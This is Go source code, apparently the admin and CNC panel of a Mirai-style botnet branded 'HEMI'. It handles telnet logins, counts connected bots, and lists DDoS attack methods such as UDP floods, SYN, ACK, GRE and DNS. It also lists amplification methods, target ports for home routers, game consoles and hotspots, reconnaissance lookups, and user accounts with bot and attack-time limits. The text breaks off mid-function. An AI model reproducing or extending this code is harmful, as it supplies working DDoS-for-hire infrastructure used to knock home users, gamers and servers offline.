package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
	"net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username | HEMI By w00dy
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;31mUsername\033[97m: \033[0;31m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;31mPassword\033[97m: \033[0;31m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[0;31mVerifying\033[0;97m... \033[0;31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\n\033[31m"))
        this.conn.Write([]byte("\033[31m[\033[97m+\033[31m]\033[0;35m HEMI \033[31m| \033[97mYour Ip Was Logged Into \033[0;31mHemi\033[0;97m Database\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\033[31m[\033[97m+\033[31m]\033[0;35m HEMI \033[31m|\033[31m Now Entering...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Reps | HEMI | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[97m               Type \033[31mHelp\033[97m or \033[31m?\033[97m to View Commands               \r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;31m[\033[97m+\033[31m]\033[97m HEMI\033[31m ~\033[97m "))
        cmd, err := this.ReadLine(false)
        
         if cmd == "Attack" || cmd == "attack" || cmd == "ATTACK" {
		 //STR, RAND, PUSH, PLAIN, STDHEX, GREETH, SYN, OVH, ACK, XMAS, DNS
            this.conn.Write([]byte("\033[31m ╔════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /ovh     \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /udppush \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
			this.conn.Write([]byte("\033[31m ║\033[97m /udprand \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /udpplain\033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
			this.conn.Write([]byte("\033[31m ║\033[97m /udpstr  \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /ack     \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /udphex  \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /greeth  \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))               
            this.conn.Write([]byte("\033[31m ║\033[97m /syn     \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m /dns     \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
			this.conn.Write([]byte("\033[31m ║\033[97m /udpstr  \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
			this.conn.Write([]byte("\033[31m ║\033[97m /xmas    \033[31m -> \033[31m[\033[97mIP\033[31m] [\033[97mTIME\033[31m]\033[97m dport=\033[31m[\033[97mPORT\033[31m]          ║\r\n"))
            this.conn.Write([]byte("\033[31m ╚════════════════════════════════════════════════╝\r\n"))
            continue
        }
				if err != nil || cmd == "API" || cmd == "api" {
            this.conn.Write([]byte("\033[1;35m ╔══════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║         \x1b[1;31mCommand = \033[97m.1                 \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mmixamp ->  \033[97mPerfect For Any Home      \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mwsd    ->  \033[97mHomes/Some Servers        \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mldap   ->  \033[97mHomes                     \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mpms    ->  \033[97mHomes/Some OVH/Servers    \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mdvr    ->  \033[97mHomes/Fortnite            \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mard    ->  \033[97mHomes/Some Servers        \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mntp    ->  \033[97mHomes                     \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31msource ->  \033[97mCheck Discord For This One\033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mcoap   ->  \033[97mHomes/Some Servers        \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ╚═══╗╔════════════════════════════╗╔═══╝ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ╔═══╝╚════════════════════════════╝╚═══╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║         \x1b[1;31mCommand = \033[97m.2                 \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mudpmxw ->  \033[97mPerfect For Any Home      \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mvmaat3 ->  \033[97mHighGBPS A.K.A TnT        \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mtcpsyn ->  \033[97mServers/Any Home          \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mudphex ->  \033[97mServers/Any Home          \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mSTD    ->  \033[97mServers/Any Home          \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mOACK   ->  \033[97mServers/Any Home          \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mudpnull->  \033[97mRip Dat Router            \033[1;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mBOTSYN ->  \033[97mServers/Any Home          \033[1;35m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;35m ║ \x1b[1;31mSTDRAND->  \033[97mServers/Any Home          \033[1;35m║   \033[0m \r\n")) 
            this.conn.Write([]byte("\033[1;35m ╚══════════════════════════════════════╝ \033[0m \r\n"))
			
			continue 

        }
         if cmd == "help" || cmd == "Help" || cmd == "HELP" || cmd == "?" {
            this.conn.Write([]byte("\033[31m ╔═════════════════════════════════════╗ \r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[97m admin  \033[31m-   \033[97m Shows Admin Commands  \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[97m tools  \033[31m-   \033[97m System Database Tools \033[31m ║\r\n"))
			this.conn.Write([]byte("\033[31m ║ \033[97m api    \033[31m-   \033[97m System Database Tools \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[97m attack \033[31m-  \033[97m Attack Commands        \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[97m ports  \033[31m-   \033[97m Open Port List        \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[97m cls    \033[31m-     \033[97m Clears Screen       \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[97m HEMI   \033[31m-     \033[97m Extra Commands      \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m ╚═════════════════════════════════════╝                         \r\n"))
            continue
        }
		if err != nil || cmd == "PORTS" || cmd == "ports" {
			this.conn.Write([]byte("\033[0;31m╔═══════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\033[0;31m║ [\033[97mHOTSPOT\033[31m]                      [\033[97mVERIZON 4G LTE\033[31m]               ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║  \033[97mUDP\033[31m -\033[97m 1900               \033[97mUDP\033[31m -\033[97m 53\033[31m,\033[97m 123\033[31m,\033[97m 500\033[31m,\033[97 4500\033[31m,\033[97m 52248\033[31m          ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║  \033[97mTCP\033[31m -\033[97m 2859\033[31m,\033[97m 5000         \033[97mTCP\033[31m -\033[97m 53 \033[31m                           ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                                                               ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                                                               ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║ [\033[97mAT&T Wi-Fi HOTSPOTS\033[31m]                     [\033[97mATTACK PORTS\033[31m]      ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║ \033[97mUDP\033[31m -\033[97m 137\033[31m,\033[97m 138\033[31m,\033[97m 139\033[31m,\033[97m 445\033[31m,\033[97m 8053       699 Good For Hotspots\033[31m    ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║ \033[97mTCP\033[31m -\033[97m 1434\033[31m,\033[97m 8053\033[31m,\033[97m 8083\033[31m,\033[97m 8084         51 Router Reset Port\033[31m     ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                                                               ║\r\n"))
            this.conn.Write([]byte("\033[0;31m║                                                               ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                       [\033[97mSTANDARD PORTS\033[31m]                        ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                     \033[97mHOME\033[31m:\033[97m 80\033[31m,\033[97m 53\033[31m,\033[97m 22\033[31m,\033[97m 8080\033[31m                    ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                         \033[97mXBOX\033[31m:\033[97m 3074\033[31m                            ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                         \033[97mPS4\033[31m:\033[97m 9307  \033[31m                           ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                    \033[97mPS3\033[31m:                                       ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                 \033[97mTCP\033[31m:\033[97m3478\033[31m,\033[97m 3479\033[31m,\033[97m 3480\033[31m,\033[97m 5223\033[31m                    ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                    \033[97mUDP\033[31m:\033[97m3478\033[31m,\033[97m 3479\033[31m                             ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                        \033[97mHOTSPOT\033[31m:\033[97m 9286\033[31m                          ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                          \033[97mVPN\033[31m:\033[97m 7777\033[31m                            ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                          \033[97mNFO\033[31m:\033[97m 1192\033[31m                            ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                          \033[97mOVH\033[31m:\033[97m 992\033[31m                             ║\r\n"))
			this.conn.Write([]byte("\033[0;31m║                     \033[97mHTTP\033[31m:\033[97m 80\033[31m,\033[97m 8080\033[31m,\033[97m443\033[31m                        ║\r\n"))
			this.conn.Write([]byte("\033[0;31m╚═══════════════════════════════════════════════════════════════╝\r\n"))
          continue 
        }
		if userInfo.admin == 0 && cmd == "admin" {
            this.conn.Write([]byte("\033[31m ║ \033[97mThis Command is Only for ADMINS!  \033[31m║ \r\n"))
            continue
        }
		
		if err != nil || cmd == "TOOLS" || cmd == "TOOL" || cmd == "tool" || cmd == "tools" {
            this.conn.Write([]byte("\033[31m╔════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/ping          \033[31m->\033[97m  Pings An IP            \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/iplookup      \033[31m->\033[97m  IP Lookup              \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/portscan      \033[31m->\033[97m  Portscans IP           \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/whois         \033[31m->\033[97m  WHOIS Search           \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/traceroute    \033[31m->\033[97m  Traceroute On IP       \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/resolve       \033[31m->\033[97m  Resolves A Website     \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/reversedns    \033[31m->\033[97m  Finds DNS Of IP        \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/asnlookup     \033[31m->\033[97m  Finds ASN Of Ip        \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/subnetcalc    \033[31m->\033[97m  Calculates A Subnet    \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[97m/zonetransfer  \033[31m->\033[97m  Shows ZoneTransfer     \033[31m ║\r\n"))
            this.conn.Write([]byte("\033[31m╚════════════════════════════════════════════╝\r\n"))
            
			continue
        }

            if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[0m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/WHOIS" || cmd == "/whois" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/PING" || cmd == "/ping" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/traceroute" || cmd == "/TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[0m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "/RESOLVE" {                  
            this.conn.Write([]byte("\x1b[31mWebsite (Without www.)\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[0m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/reversedns" || cmd == "/REVERSEDNS" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/asnlookup" || cmd == "/asnlookup" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
            this.conn.Write([]byte("\x1b[31mIP Address\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }

            if err != nil || cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[31mIP Address Or Website (Without www.)\x1b[0m: \x1b[31m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[31mResponse\x1b[31m: \r\n\x1b[31m" + locformatted + "\r\n"))
        }
		      if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[31m ╔══════════════════════════════╗  \r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m addbasic\033[31m - \033[97mAdd Basic Client\033[31m  ║  \r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m addadmin\033[31m - \033[97mAdd Admin Client\033[31m  ║  \r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m remove  \033[31m - \033[97mRemove User     \033[31m  ║  \r\n"))
            this.conn.Write([]byte("\033[31m ╚══════════════════════════════╝  \r\n"))
            continue
        }
		
			if cmd == "HEMI" {
            this.conn.Write([]byte("\033[31m ╔═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m  bots\033[31m    -\033[97m   Shows BotCount\033[31m   ║  \r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m  cls \033[31m    -\033[97m   Clears screen \033[31m   ║  \r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m  Red \033[31m    -\033[97m   HEMI Banner Red\033[31m  ║  \r\n"))
            this.conn.Write([]byte("\033[31m ║\033[97m  White \033[31m  -\033[97m   HEMI Banner White\033[31m║  \r\n"))
            this.conn.Write([]byte("\033[31m ╚═══════════════════════════════╝  \r\n"))
            continue
        }
		
        
         if cmd == "Red" || cmd == "Red" || cmd == "R" {
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[31m                 ╦ ╦╔═╗╔╦╗╦                  \r\n"))
    this.conn.Write([]byte("\033[31m                 ╠═╣║╣ ║║║║                  \r\n"))
    this.conn.Write([]byte("\033[31m                 ╩ ╩╚═╝╩ ╩╩                  \r\n"))
    this.conn.Write([]byte("\033[31m               Type \033[97mHelp\033[31m or \033[97m?\033[31m to View Commands               \r\n"))
    this.conn.Write([]byte("\033[31m                                                             \r\n"))   

        }

		 if cmd == "cls" || cmd == "clear" || cmd == "c" || cmd == "White" || cmd == "W" {
	this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[97m                  ▄  █ ▄███▄   █▀▄▀█ ▄█                   \r\n"))
    this.conn.Write([]byte("\033[97m                 ██   █ █▀   ▀  █ █ █ ██                  \r\n"))
    this.conn.Write([]byte("\033[97m                 ███▀▀█ ██▄▄    █ ▄ █ ██                  \r\n"))
    this.conn.Write([]byte("\033[97m                 █   █ █▄   ▄▀ █   █ ▐█                   \r\n"))
    this.conn.Write([]byte("\033[97m                    █  ▀███▀      █   ▐                   \r\n"))
    this.conn.Write([]byte("\033[97m                   ▀             ▀                        \r\n"))
    this.conn.Write([]byte("\033[97m               Type \033[31mHelp\033[97m or \033[31m?\033[97m to View Commands               \r\n"))
    this.conn.Write([]byte("\033[97m                                                             \r\n"))	
	
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots
		
			if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[95mUsername:\033[95m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mPassword:\033[95m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[95mBotcount\033[95m(\033[95m-1 for access to all\033[95m)\033[95m:\033[95m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s\033[95m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[95mAttack Duration\033[95m(\033[95m-1 for none\033[95m)\033[95m:\033[95m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[95m%s\033[95m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
